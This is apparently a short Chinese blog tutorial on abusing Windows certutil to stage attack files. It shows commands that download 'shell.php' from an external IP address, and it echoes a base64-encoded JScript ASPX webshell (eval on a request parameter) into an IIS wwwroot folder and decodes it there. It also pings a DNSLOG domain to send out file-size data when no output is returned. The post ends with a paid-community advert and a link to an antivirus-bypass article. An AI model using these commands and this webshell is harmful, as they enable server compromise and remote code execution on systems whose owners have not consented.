certutil
--------

certutil也是windows下一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server 2003使用会有问题。也就是说，以下命令是在Win7及其以后的机器使用。

### 远程下载

```
certutil -urlcache -split -f http://114.118.80.138/shell.php  #下载文件到当前目录下       
certutil -urlcache -split -f http://114.118.80.138/shell.php  c:/users/xie/desktop/shell.php        #下载文件到指定目录下
```


![](https://img-blog.csdnimg.cn/20190822164138129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 文件base64编码解码

```
将a.txt文件base64编码为b.txt      
certutil -encode a.txt b.txt       
将c.txt文件base64解码为c.txt      
certutil -decode b.txt c.txt
```


所以可以将木马base64编码后再解码。这里的木马可以是exe木马或者是webshell等任何文件均可。

![](https://img-blog.csdnimg.cn/20210324142154581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后通过echo写进去，再利用certutil进行base64解码

```
echo PCVAUGFnZSBMYW5ndWFnZT0iSnNjcmlwdCIlPjwlZXZhbChSZXF1ZXN0Lkl0ZW1bImFudCJdLCJ1bnNhZmUiKTslPg== >> C:\inetpub\wwwroot\aspnet_client\1.aspx       
certutil -decode C:\inetpub\wwwroot\aspnet_client\1.aspx C:\inetpub\wwwroot\aspnet_client\2.aspx
```


![](https://img-blog.csdnimg.cn/20210323003642361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果碰到文件太大，不能一次性写进去的话，需要将base64编码后的数据分段写进去。再将所有base64分段写进去后，如何判断文件的完整性，可以通过如下命令判断文件的大小：

```
#如果能回显      
$a=(Get-ChildItem -Path 1.txt).Length;echo $a;       
#如果不能回显      
$a=(Get-ChildItem -Path xx.txt).Length;ping aa.$a.DNSLOG地址;
```


![](https://img-blog.csdnimg.cn/20210324232539870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 ![](https://img-blog.csdnimg.cn/2021032423250868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

 相关文章：[【BypassAV】全程绕过各种拦截之从前端到后端到域控](https://mp.weixin.qq.com/s/lfC24l40JuA2Hi-SAYEprg "【BypassAV】全程绕过各种拦截之从前端到后端到域控")